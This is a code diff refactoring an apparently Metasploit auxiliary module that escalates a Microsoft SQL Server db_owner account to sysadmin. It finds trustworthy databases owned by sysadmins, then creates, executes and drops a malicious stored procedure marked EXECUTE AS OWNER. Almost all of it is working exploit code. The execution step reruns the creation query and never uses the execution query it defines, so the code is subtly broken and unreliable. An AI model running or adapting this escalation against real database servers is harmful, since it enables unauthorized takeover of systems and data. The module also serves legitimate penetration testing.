@@ -51,16 +51,17 @@ class Metasploit3 < Msf::Auxiliary
 
     # Check for trusted databases owned by sysadmins
     print_status("Checking for trusted databases owned by sysadmins...")
-    trust_db_list = check_trustdbs
-    if trust_db_list == 0
+    trust_db_list = check_trust_dbs
+    if trust_db_list.length == 0
       print_error('No databases owned by sysadmin were found flagged as trustworthy.')
       disconnect
       return
-    end
-
-    # Display list of accessible databases to user
-    trust_db_list.each do |db|
-      print_status(" - #{db[0]}")
+    else
+      # Display list of accessible databases to user
+      print_good("#{trust_db_list.length} affected database(s) were found:")
+      trust_db_list.each do |db|
+        print_status(" - #{db[0]}")
+      end
     end
 
     # Check if the user has the db_owner role in any of the databases
@@ -75,16 +76,16 @@ class Metasploit3 < Msf::Auxiliary
     # Attempt to escalate to sysadmin
     print_status("Attempting to escalate in #{dbowner_status}!")
     escalate_status = escalate_privs(dbowner_status)
-    if escalate_status == 1
+    if escalate_status
       # Check if escalation was successful
       user_status = check_sysadmin
       if user_status == 1
-        print_good("Congrats, #{datastore['username']} is now a sysadmin!.")
+        print_good("Congrats, #{datastore['USERNAME']} is now a sysadmin!.")
       else
         print_error("Fail buckets, something went wrong.")
       end
     else
-      print_error("Error: #{escalate_status}")
+      print_error("Error while trying to escalate status")
     end
 
     disconnect
@@ -108,7 +109,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   # Gets trusted databases owned by sysadmins
-  def check_trustdbs
+  def check_trust_dbs
     # Setup query
     sql = "SELECT d.name AS DATABASENAME
     FROM sys.server_principals r
@@ -118,28 +119,16 @@ class Metasploit3 < Msf::Auxiliary
     inner join sys.databases d on suser_sname(d.owner_sid) = p.name
     WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB') and r.type = 'R' and r.name = N'sysadmin'"
 
-    begin
-      # Run query
-      result = mssql_query(sql)
-    rescue
-      # Return on fail
-      return 0
-    end
-
-    # Parse query results
-    parse_results = result[:rows]
-    trustedb_count = parse_results.count
-    print_good("#{trustedb_count} affected database(s) were found:")
+    result = mssql_query(sql)
 
     # Return on success
-    return parse_results
-
+    return result[:rows]
   end
 
   # Checks if user has the db_owner role
-  def check_db_owner(trustdb_list)
+  def check_db_owner(trust_db_list)
     # Check if the user has the db_owner role is any databases
-    trustdb_list.each { |db|
+    trust_db_list.each do |db|
       # Setup query
       sql = "use #{db[0]};select db_name() as db,rp.name as database_role, mp.name as database_user
       from [#{db[0]}].sys.database_role_members drm
@@ -150,24 +139,19 @@ class Metasploit3 < Msf::Auxiliary
       # Run query
       result = mssql_query(sql)
 
-      begin
-        # Parse query results
-        parse_results = result[:rows]
-        if parse_results.any?
-          print_good("- db_owner on #{db[0]} found!")
-          return db[0]
-        else
-          return 0
-        end
-      rescue
-        print_error("- No db_owner on #{db[0]}")
+      # Parse query results
+      parse_results = result[:rows]
+      if parse_results.any?
+        print_good("- db_owner on #{db[0]} found!")
+        return db[0]
       end
-    }
+    end
+
+    nil
   end
 
   def escalate_privs(dbowner_db)
     # Create the evil stored procedure WITH EXECUTE AS OWNER
-    # Setup query
     evil_sql_create = "use #{dbowner_db};
     DECLARE @myevil as varchar(max)
     set @myevil = '
@@ -179,49 +163,22 @@ class Metasploit3 < Msf::Auxiliary
     end';
     exec(@myevil);
     select 1;"
-
-    begin
-      # Run query
-      mssql_query(evil_sql_create)
-    rescue
-      # Return error
-      error = 'Failed to create stored procedure.'
-      return error
-    end
+    mssql_query(evil_sql_create)
 
     # Run the evil stored procedure
-    # Setup query
     evilsql_run = "use #{dbowner_db};
     DECLARE @myevil2 as varchar(max)
     set @myevil2 = 'EXEC sp_elevate_me'
     exec(@myevil2);"
-
-    begin
-      # Run query
-      mssql_query(evil_sql_create)
-    rescue
-      # Return error
-      error = 'Failed to run stored procedure.'
-      return error
-    end
+    mssql_query(evil_sql_create)
 
     # Remove evil procedure
-    # Setup query
     evilsql_remove = "use #{dbowner_db};
     DECLARE @myevil3 as varchar(max)
     set @myevil3 = 'DROP PROCEDURE sp_elevate_me'
     exec(@myevil3);"
+    mssql_query(evilsql_remove)
 
-    begin
-      # Run query
-      mssql_query(evilsql_remove)
-
-      # Return value
-      return 1
-    rescue
-      # Return error
-      error = 'Failed to run stored procedure.'
-      return error
-    end
+    true
   end
 end
